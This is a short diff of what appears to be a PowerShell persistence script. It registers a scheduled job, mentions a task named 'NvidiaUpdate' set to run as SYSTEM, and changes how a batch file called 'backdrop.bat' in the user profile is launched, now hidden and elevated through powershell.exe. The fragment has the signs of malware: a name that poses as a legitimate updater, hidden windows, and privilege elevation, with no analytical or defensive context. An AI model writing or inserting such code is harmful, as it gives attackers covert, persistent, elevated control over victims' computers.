@@ -48,4 +48,4 @@ Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger
 
 #Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
 
-start-process "cmd.exe" "/c %appdata%\Microsoft\backdrop.bat" -WindowStyle Hidden -Verb RunAs
+start-process "powershell.exe" -ArgumentList "cmd /c $homedir\backdrop.bat" -WindowStyle Hidden -Verb RunAs
